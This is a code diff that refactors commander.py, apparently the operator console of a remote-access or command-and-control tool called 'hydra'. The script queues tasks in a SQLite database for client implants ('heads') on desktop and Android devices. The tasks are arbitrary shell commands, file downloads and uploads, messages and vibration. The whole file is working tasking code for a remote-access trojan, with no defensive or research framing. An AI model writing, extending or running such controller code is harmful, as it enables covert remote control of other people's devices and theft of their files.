@@ -1,50 +1,54 @@
 import sqlite3
 import json
 import sys
+import os
 
-def send_command(client_id, action, payload):
-    try:
-        # Connect to the hydra database
-        conn = sqlite3.connect('hydra_heads.db')
-        cursor = conn.cursor()
+DB_PATH = "hydra_heads.db"
 
-        # Convert payload dict to JSON string
-        payload_json = json.dumps(payload)
-
-        # Insert the task into the queue
-        cursor.execute('''
-            INSERT INTO tasks (client_id, action, payload, status)
-            VALUES (?, ?, ?, 'pending')
-        ''', (client_id, action, payload_json))
-
-        conn.commit()
-        conn.close()
-        print(f"[+] Task '{action}' successfully queued for {client_id}")
+def add_task(client_id, action, payload):
+    conn = sqlite3.connect(DB_PATH)
+    cursor = conn.cursor()
     
-    except Exception as e:
-        print(f"[-] Error queuing task: {e}")
+    # payload is expected to be a dictionary
+    payload_json = json.dumps(payload)
+    
+    cursor.execute("""
+        INSERT INTO tasks (client_id, action, payload, status)
+        VALUES (?, ?, ?, 'pending')
+    """, (client_id, action, payload_json))
+    
+    conn.commit()
+    conn.close()
+    print(f"[+] Task '{action}' added for {client_id}")
+
+def main():
+    if len(sys.argv) < 4:
+        print("Usage:")
+        print("  python commander.py <ID> shell <command>")
+        print("  python commander.py <ID> msg <message>")
+        print("  python commander.py <ID> vibrate <duration_ms>")
+        print("  python commander.py <ID> download <filename>")
+        print("  python commander.py <ID> upload <remote_path>")
+        return
+
+    client_id = sys.argv[1]
+    command_type = sys.argv[2]
+    argument = sys.argv[3]
+
+    if command_type == "shell":
+        add_task(client_id, "shell", {"cmd": argument})
+    elif command_type == "msg":
+        add_task(client_id, "msg", {"content": argument})
+    elif command_type == "vibrate":
+        add_task(client_id, "vibrate", {"duration": int(argument)})
+    elif command_type == "download":
+        # The Rust head expects {"filename": "..."}
+        add_task(client_id, "download", {"filename": argument})
+    elif command_type == "upload":
+        # The Rust head expects {"path": "..."}
+        add_task(client_id, "upload", {"path": argument})
+    else:
+        print(f"[!] Unknown command type: {command_type}")
 
 if __name__ == "__main__":
-    # Simple CLI logic for testing
-    if len(sys.argv) < 3:
-        print("Usage: python commander.py <client_id> <action> <data>")
-        print("Example: python commander.py DESKTOP-HEAD-ALPHA shell \"uname -a\"")
-        print("Example: python commander.py ANDROID-HEAD-01 vibrate 2000")
-    else:
-        target = sys.argv[1]
-        cmd_type = sys.argv[2]
-        
-        if cmd_type == "shell":
-            command_string = sys.argv[3]
-            send_command(target, "shell", {"cmd": command_string})
-        
-        elif cmd_type == "vibrate":
-            duration = int(sys.argv[3])
-            send_command(target, "vibrate", {"duration": duration})
-            
-        elif cmd_type == "msg":
-            message = sys.argv[3]
-            send_command(target, "msg", {"content": message})
-        
-        else:
-            print(f"[!] Unknown command type: {cmd_type}")
+    main()
